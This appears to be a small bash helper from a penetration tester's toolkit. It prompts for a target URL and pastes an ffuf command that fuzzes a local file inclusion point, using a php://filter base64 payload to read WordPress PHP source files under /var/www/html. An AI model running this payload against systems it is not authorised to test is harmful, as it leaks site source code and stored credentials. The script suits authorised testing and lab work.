#!/bin/bash

: '
fuzz for wordpress files in var www html with php filter base64
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website"

WEBSITE=${form_data["Website"]}

paste_command "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FILE -u '${WEBSITE}php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/FILE.php' -fs 0"